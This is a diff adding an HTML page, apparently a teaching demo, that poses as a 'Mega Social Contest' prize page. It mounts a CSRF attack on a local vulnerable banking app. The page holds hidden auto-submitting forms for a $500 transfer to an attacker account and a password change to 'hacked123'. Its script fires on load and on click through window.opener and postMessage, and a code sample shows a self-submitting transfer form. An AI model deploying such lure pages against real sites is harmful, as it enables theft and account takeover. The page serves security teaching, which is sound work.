@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Media Contest - Win Big!</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
+        .container { max-width: 800px; margin: 0 auto; background: rgba(255,255,255,0.95); color: #333; padding: 20px; border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.3); }
+        .header { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; padding: 30px; border-radius: 8px; text-align: center; margin: -20px -20px 20px -20px; }
+        .warning { background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 4px; margin: 20px 0; color: #c62828; }
+        .contest-form { background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .hidden-forms { border: 2px dashed #f44336; padding: 15px; margin: 20px 0; background: #ffebee; }
+        .code-example { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; margin: 10px 0; overflow-x: auto; font-family: 'Courier New', monospace; }
+        .btn { padding: 12px 24px; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        .fake-form input, .fake-form select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        .attack-status { background: #fff3e0; padding: 15px; border-radius: 4px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎉 MEGA SOCIAL CONTEST 2024</h1>
+            <p>Win $10,000 Cash Prize + iPhone 15 Pro + MacBook Pro!</p>
+            <p style="font-size: 20px; margin-top: 20px;">🔥 Only 50 Winners! Enter NOW!</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ CSRF Attack Warning:</strong> This page contains hidden forms that will submit malicious requests!
+            <br>If you're logged into the banking site, a $500 transfer may be executed.
+        </div>
+
+        <div class="attack-status">
+            <h3>🎯 POST-based CSRF Attack Status</h3>
+            <p><strong>Attack Type:</strong> Hidden Form Auto-Submit</p>
+            <p><strong>Target Amount:</strong> $500</p>
+            <p><strong>Method:</strong> POST request with form data</p>
+            <p><strong>Status:</strong> <span id="attackStatus">Preparing attack...</span></p>
+        </div>
+
+        <div class="contest-form fake-form">
+            <h2>📝 Enter the Contest (Fake Form)</h2>
+            <p>Fill out this form to enter our amazing contest! (This is just a distraction)</p>
+            
+            <input type="text" placeholder="Your Full Name" value="">
+            <input type="email" placeholder="Your Email Address" value="">
+            <input type="tel" placeholder="Phone Number" value="">
+            <select>
+                <option>Select your country</option>
+                <option>United States</option>
+                <option>Canada</option>
+                <option>United Kingdom</option>
+                <option>Australia</option>
+            </select>
+            <input type="text" placeholder="Referral Code (Optional)" value="">
+            
+            <button class="btn" onclick="submitFakeForm()">🎁 ENTER CONTEST NOW!</button>
+        </div>
+
+        <div class="hidden-forms">
+            <h3>🚨 Hidden CSRF Attack Forms</h3>
+            <p>These forms are invisible and will auto-submit to perform CSRF attacks:</p>
+
+            <!-- 🚨 PRIMARY CSRF ATTACK FORM -->
+            <form id="csrfAttackForm" action="../vulnerable-bank.html" method="POST" style="display: none;">
+                <input type="hidden" name="transferTo" value="999888777">
+                <input type="hidden" name="transferAmount" value="500">
+                <input type="hidden" name="transferDescription" value="POST-based CSRF Attack">
+                <input type="hidden" name="action" value="transfer">
+            </form>
+
+            <!-- 🚨 BACKUP CSRF ATTACK FORM (different target) -->
+            <form id="csrfBackupForm" action="http://localhost:3000/api/transfer" method="POST" style="display: none;">
+                <input type="hidden" name="to" value="attacker_account_123">
+                <input type="hidden" name="amount" value="500">
+                <input type="hidden" name="description" value="Hidden form CSRF attack">
+            </form>
+
+            <!-- 🚨 ALTERNATE ATTACK FORM (password change attempt) -->
+            <form id="csrfPasswordForm" action="../vulnerable-bank.html" method="POST" style="display: none;">
+                <input type="hidden" name="action" value="changePassword">
+                <input type="hidden" name="newPassword" value="hacked123">
+                <input type="hidden" name="confirmPassword" value="hacked123">
+            </form>
+
+            <div class="code-example">
+&lt;!-- Hidden CSRF form that auto-submits --&gt;
+&lt;form action="http://bank.com/transfer" method="POST" style="display:none;"&gt;
+    &lt;input type="hidden" name="to" value="attacker_account"&gt;
+    &lt;input type="hidden" name="amount" value="500"&gt;
+    &lt;input type="submit"&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+    // Auto-submit the form when page loads
+    document.forms[0].submit();
+&lt;/script&gt;
+            </div>
+        </div>
+
+        <div style="margin-top: 30px; padding: 20px; background: #f9f9f9; border-radius: 8px;">
+            <h3>🔍 How POST-based CSRF Works:</h3>
+            <ol>
+                <li><strong>User visits malicious page</strong> (this contest page)</li>
+                <li><strong>Hidden forms</strong> are automatically submitted via JavaScript</li>
+                <li><strong>POST request sent</strong> to banking site with malicious data</li>
+                <li><strong>Browser includes cookies</strong> automatically with the request</li>
+                <li><strong>Banking server processes</strong> the POST as legitimate</li>
+                <li><strong>Action executed</strong> without user consent (money transfer)</li>
+            </ol>
+
+            <h3>⚔️ Attack Variations:</h3>
+            <ul>
+                <li>🎯 <strong>Auto-submit on page load</strong> - Immediate attack</li>
+                <li>🎯 <strong>Submit on user interaction</strong> - Triggered by clicks</li>
+                <li>🎯 <strong>Multiple forms</strong> - Several attacks at once</li>
+                <li>🎯 <strong>Iframe submission</strong> - Hidden in invisible frame</li>
+            </ul>
+
+            <h3>🛡️ Why This Attack Works:</h3>
+            <ul>
+                <li>❌ <strong>No CSRF token validation</strong></li>
+                <li>❌ <strong>No origin header checking</strong></li>
+                <li>❌ <strong>Automatic cookie inclusion</strong></li>
+                <li>❌ <strong>Same-origin policy doesn't block form submissions</strong></li>
+            </ul>
+        </div>
+
+        <!-- Loading animation to distract user -->
+        <div id="loadingAnimation" style="text-align: center; margin: 30px 0;">
+            <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+            <p style="margin-top: 15px;">Processing your contest entry...</p>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        let attackAttempted = false;
+        let attackSuccessful = false;
+
+        function updateAttackStatus(status) {
+            document.getElementById('attackStatus').textContent = status;
+            console.log('🚨 Attack Status:', status);
+        }
+
+        function submitFakeForm() {
+            // Show fake success message
+            alert('Thank you for entering! We will contact you if you win.');
+            
+            // Trigger additional CSRF attacks when user interacts
+            if (!attackAttempted) {
+                performCSRFAttacks();
+            }
+        }
+
+        function performCSRFAttacks() {
+            attackAttempted = true;
+            updateAttackStatus('Executing CSRF attacks...');
+
+            // Method 1: Try to access parent banking window
+            try {
+                if (window.opener && window.opener.bankingApp) {
+                    console.log('🎯 Found banking app in parent window!');
+                    
+                    const attackParams = {
+                        to: '999888777',
+                        amount: 500,
+                        description: 'POST-based CSRF Attack'
+                    };
+                    
+                    const success = window.opener.bankingApp.processCSRFTransfer(attackParams);
+                    
+                    if (success) {
+                        attackSuccessful = true;
+                        updateAttackStatus('CSRF attack successful via parent window!');
+                        console.log('🚨 POST-based CSRF attack succeeded!');
+                    }
+                }
+            } catch (error) {
+                console.log('Parent window access failed:', error);
+            }
+
+            // Method 2: PostMessage attack
+            if (window.opener) {
+                const attackData = {
+                    type: 'csrf_attack',
+                    params: {
+                        to: '999888777',
+                        amount: 500,
+                        description: 'POST-based CSRF via postMessage'
+                    }
+                };
+                
+                window.opener.postMessage(attackData, '*');
+                console.log('🚨 Sent POST-based CSRF attack via postMessage');
+            }
+
+            // Method 3: Try form submission (would need actual server endpoint)
+            setTimeout(() => {
+                try {
+                    // This would submit to actual banking endpoint if it existed
+                    // document.getElementById('csrfAttackForm').submit();
+                    console.log('🚨 Would submit hidden form to banking endpoint');
+                } catch (error) {
+                    console.log('Form submission failed:', error);
+                }
+                
+                if (!attackSuccessful) {
+                    updateAttackStatus('Attack attempts completed - check banking app');
+                }
+            }, 2000);
+        }
+
+        // Auto-execute attack when page loads (after a delay)
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                if (!attackAttempted) {
+                    console.log('🚨 Auto-executing CSRF attack on page load');
+                    performCSRFAttacks();
+                }
+            }, 3000); // Wait 3 seconds to seem more legitimate
+        });
+
+        // Hide loading animation after attack
+        setTimeout(() => {
+            const loadingDiv = document.getElementById('loadingAnimation');
+            if (loadingDiv) {
+                loadingDiv.style.display = 'none';
+            }
+        }, 5000);
+
+        console.log('🚨 POST-based CSRF attack page loaded');
+        console.log('🎯 Will attempt $500 transfer via multiple vectors');
+        console.log('⚠️  Attack will trigger automatically and on user interaction');
+    </script>
+
+    <div style="margin-top: 30px; text-align: center; color: #666; background: white; padding: 15px; border-radius: 8px;">
+        <p><strong>Educational Note:</strong> This demonstrates how attractive websites can hide malicious forms</p>
+        <p>Always verify that contest/prize websites are legitimate before entering personal information!</p>
+        <p><small>Check your banking application to see if the CSRF attack succeeded</small></p>
+    </div>
+</body>
+</html> 
